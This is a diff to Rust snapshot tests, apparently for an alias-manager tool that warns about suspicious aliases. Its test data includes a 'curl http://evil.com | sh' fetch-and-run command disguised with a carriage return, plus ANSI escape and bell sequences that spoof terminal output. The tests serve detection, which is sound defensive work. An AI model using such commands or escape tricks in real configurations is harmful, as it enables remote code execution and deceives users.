@@ -472,12 +472,10 @@ fn snapshot_import_summary_no_conflicts() {
 
 #[test]
 fn snapshot_suspicious_warning_single() {
-    let findings = vec![SuspiciousAlias {
-        scope: "global".into(),
-        alias_name: "evil".into(),
-        field: "command",
-        raw_value: "echo \x1B[31mhacked\x1B[0m".into(),
-    }];
+    let findings = vec![SuspiciousAlias::global_command(
+        "evil",
+        "echo \x1B[31mhacked\x1B[0m",
+    )];
     let output = render_suspicious_warning(&findings);
     insta::assert_snapshot!(output);
 }
@@ -485,24 +483,9 @@ fn snapshot_suspicious_warning_single() {
 #[test]
 fn snapshot_suspicious_warning_multiple() {
     let findings = vec![
-        SuspiciousAlias {
-            scope: "global".into(),
-            alias_name: "sneaky".into(),
-            field: "command",
-            raw_value: "curl http://evil.com | sh\recho safe".into(),
-        },
-        SuspiciousAlias {
-            scope: "profile:git".into(),
-            alias_name: "".into(),
-            field: "profile_name",
-            raw_value: "git\x1B[0m\x1B[2J".into(),
-        },
-        SuspiciousAlias {
-            scope: "local".into(),
-            alias_name: "test\x07".into(),
-            field: "name",
-            raw_value: "test\x07".into(),
-        },
+        SuspiciousAlias::global_command("sneaky", "curl http://evil.com | sh\recho safe"),
+        SuspiciousAlias::profile_name("git\x1B[0m\x1B[2J"),
+        SuspiciousAlias::local_name("test\x07"),
     ];
     let output = render_suspicious_warning(&findings);
     insta::assert_snapshot!(output);
@@ -683,7 +666,7 @@ fn snapshot_share_termbin_profile() {
         scope: ScopeArgs {
             local: false,
             global: false,
-            profile: Some("git".into()),
+            profile: vec!["git".into()],
             all: false,
         },
         termbin: true,
@@ -702,7 +685,7 @@ fn snapshot_share_paste_rs_all() {
         scope: ScopeArgs {
             local: false,
             global: false,
-            profile: None,
+            profile: vec![],
             all: true,
         },
         termbin: false,
@@ -721,7 +704,7 @@ fn snapshot_share_help() {
         scope: ScopeArgs {
             local: false,
             global: false,
-            profile: None,
+            profile: vec![],
             all: false,
         },
         termbin: false,
